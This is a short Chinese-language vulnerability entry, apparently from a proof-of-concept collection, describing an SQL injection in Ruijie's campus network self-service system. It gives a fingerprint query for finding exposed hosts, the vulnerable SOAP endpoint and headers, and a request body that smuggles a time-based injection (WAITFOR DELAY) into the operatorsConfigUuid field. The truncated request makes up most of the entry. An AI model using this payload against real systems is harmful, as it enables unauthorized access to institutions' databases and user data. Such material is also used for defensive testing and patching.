# 锐捷校园网自助服务系统selfservice接口存在SQL注入漏洞

- **系统**：锐捷　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title=="校园网自助服务系统"`
- **请求**：`POST /selfservice/service/operatorReportorRoamService HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=42E7A33A54CABB1580E34F01B3D63480; JSESSIONID=0616C2E6B689FD5702EE3E22…`　`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 873`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com" xmlns:dom="http://domain.service.webservice.common.spl.ruijie...">
<soapenv:Header/>
<soapenv:Body>
<ser:queryAccountNumReportDataDetail>
<ser:in0>
<!--type: dateTime-->
<dom:endTime>2008-09-29T09:49:45</dom:endTime>
<!--type: int-->
<dom:limit>3</dom:limit>
<!--type: int-->
<dom:offSet>3</dom:offSet>
<!--type: string-->
<dom:operatorsConfigUuid>aeoliam venit';WAITFOR DELAY '0:0:5'--</dom:operatorsConfigUuid>
<!--type: dateTime-->
<dom:startTime>2014-06-09T23:…（脚本共 713 字，完整版见原文）
```